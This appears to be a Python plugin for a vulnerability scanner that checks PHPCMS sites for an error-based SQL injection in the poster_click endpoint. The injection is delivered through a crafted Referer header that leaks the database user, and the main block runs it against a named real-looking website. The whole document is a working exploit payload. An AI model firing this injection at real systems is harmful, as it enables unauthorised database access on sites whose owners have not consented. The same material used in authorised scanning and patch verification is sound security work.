#!/usr/bin/env python
# -*- coding: utf-8 -*-
#from:http://0day5.com/archives/319

def assign(service,arg):
    if service == "phpcms":
        return True, arg

def audit(arg):
    url = arg + '/index.php?m=poster&c=index&a=poster_click&id=1'
    payload = "Referer:',(SELECT 1 FROM(SELECT COUNT(*),CONCAT(user(),FLOOR(RAND(0)*2))X FROM information_schema.tables GROUP BY X)a),'1')#"
    code, head, res, errcode,finalurl =  curl.curl("-H \"%s\" %s" % (payload,url))

    if code == 200 and res.find("for key 'group_key'") != -1:
        security_hole(url)

if __name__ == "__main__":
    from dummy import *
    audit(assign('phpcms', 'http://9expo.gzdsw.com/')[1])